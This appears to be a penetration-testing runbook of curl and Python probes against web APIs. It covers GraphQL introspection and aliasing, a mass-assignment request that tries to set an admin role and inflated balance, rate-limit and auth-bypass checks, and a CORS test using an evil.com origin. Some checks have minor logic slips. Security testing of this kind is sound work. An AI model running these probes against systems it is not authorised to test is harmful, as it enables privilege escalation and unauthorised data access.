# API Probe Runbook

## Purpose
Low-impact probing of API endpoints. Test GraphQL introspection depth, REST mass assignment, rate limiting, and authorization.

## Variables
- `$TARGET_URL` — API base URL or specific endpoint
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — authenticated session cookie jar
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/api`

## Workflow A — GraphQL Probing

### A1. Full introspection query
```bash
curl -sk "$TARGET_URL/graphql" -H "Content-Type: application/json" -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{name description fields{name type{name kind ofType{name kind}}}}directives{name description locations args{name}}}}"}' -o "$OUTDIR/gql-full-introspection.json"
python3 -c "
import json
d=json.load(open('$OUTDIR/gql-full-introspection.json'))
if 'data' in d and d['data'].get('__schema'):
    types=d['data']['__schema'].get('types',[])
    print(f'GraphQL Introspection: {len(types)} types discovered')
    for t in types[:10]:
        print(f'  Type: {t.get(\"name\")} ({len(t.get(\"fields\",[]))} fields)')
else:
    print('Introspection disabled or failed')
"
```

### A2. Test for query batching / aliasing (DoS potential)
```bash
curl -sk "$TARGET_URL/graphql" -H "Content-Type: application/json" -d '{"query":"query{q1:__typename q2:__typename q3:__typename q4:__typename q5:__typename q6:__typename q7:__typename q8:__typename q9:__typename q10:__typename}"}' -o "$OUTDIR/gql-aliasing-check.txt"
grep -qiE 'errors|too many' "$OUTDIR/gql-aliasing-check.txt" && echo "GraphQL aliasing limited" || echo "GraphQL aliasing NOT limited" >> "$OUTDIR/api-hits.txt"
```

### A3. Check for field suggestions (info leak)
```bash
curl -sk "$TARGET_URL/graphql" -H "Content-Type: application/json" -d '{"query":"{user(id:1){nonexistentfield}}"}' -o "$OUTDIR/gql-suggestions.txt"
grep -qiE 'Did you mean|Cannot query field.*Did you mean' "$OUTDIR/gql-suggestions.txt" && echo "GraphQL FIELD SUGGESTIONS ENABLED" >> "$OUTDIR/api-hits.txt"
```

### A4. Test for deprecated but accessible fields
```bash
curl -sk "$TARGET_URL/graphql" -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){fields(includeDeprecated:true){name isDeprecated deprecationReason}}}"}' -o "$OUTDIR/gql-deprecated.txt"
grep -qiE 'deprecated|password|secret|token' "$OUTDIR/gql-deprecated.txt" && echo "GraphQL: deprecated sensitive fields found" >> "$OUTDIR/api-hits.txt"
```

## Workflow B — REST API Probing

### B1. Mass assignment probe
```bash
curl -sk -X PUT "$TARGET_URL/api/user/me" -H "Content-Type: application/json" -b "$COOKIE_JAR" -d '{"role":"admin","isAdmin":true,"is_active":true,"plan":"enterprise","balance":999999}' -o "$OUTDIR/mass-assignment-probe.json"
python3 -c "
import json
d=json.load(open('$OUTDIR/mass-assignment-probe.json'))
admin_keys=['role','isAdmin','is_admin','admin','plan','balance']
for k in admin_keys:
    if k in d:
        print(f'Mass assignment candidate: {k} = {d[k]}')
"
```

### B2. Rate limiting probe
```bash
for i in $(seq 1 20); do
  curl -sk -o /dev/null -w "%{http_code}" "$TARGET_URL/api/endpoint" >> "$OUTDIR/rate-limit-codes.txt"
  echo "" >> "$OUTDIR/rate-limit-codes.txt"
done
grep -c "429" "$OUTDIR/rate-limit-codes.txt" && echo "Rate limit: HTTP 429 detected" >> "$OUTDIR/api-hits.txt" || echo "NO RATE LIMITING" >> "$OUTDIR/api-hits.txt"
```

### B3. Parameter pollution probe
```bash
curl -sk "$TARGET_URL/api/search?q=test&q=admin" -o "$OUTDIR/param-pollution-probe.txt"
curl -sk "$TARGET_URL/api/user?id=1&id=2" -b "$COOKIE_JAR" -o "$OUTDIR/param-pollution-id.txt"
diff "$OUTDIR/param-pollution-probe.txt" /dev/null
```

### B4. Unauthenticated access to auth-required endpoints
```bash
while read -r endpoint; do
  AUTH_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -b "$COOKIE_JAR" "$TARGET_URL$endpoint")
  ANON_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint")
  [ "$AUTH_CODE" = "200" ] && [ "$ANON_CODE" = "200" ] && echo "UNPROTECTED: $endpoint (200 both auth and anon)" >> "$OUTDIR/api-hits.txt"
done < "$OUTDIR/all-api-endpoints.txt"
```

## Workflow C — CORS Misconfiguration on APIs

### C1. Test CORS on API endpoints
```bash
curl -sk -v -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" "$TARGET_URL/api/user" -o "$OUTDIR/cors-api-probe.txt" 2>&1
grep -i 'access-control-allow-origin.*evil.com' "$OUTDIR/cors-api-probe.txt" && echo "CORS: origin reflected on API" >> "$OUTDIR/api-hits.txt"
```

## Signals
| Signal | Confidence | Action |
|---|---|---|
| GraphQL full schema exposed | High | Enumerate sensitive queries/mutations |
| Mass assignment accepted | High | Verify privilege escalation |
| No rate limiting (20 reqs, no 429) | Medium | Test for brute-force or resource exhaustion |
| Auth bypass on protected endpoint | Very High | Verify data exposure |
| CORS origin: * or reflected | Medium | Test for CSRF-style API attacks |

## Next Routing
- Any hit confirmed -> `runbooks/03-verify.md`
- No hits -> expand API scope or stop
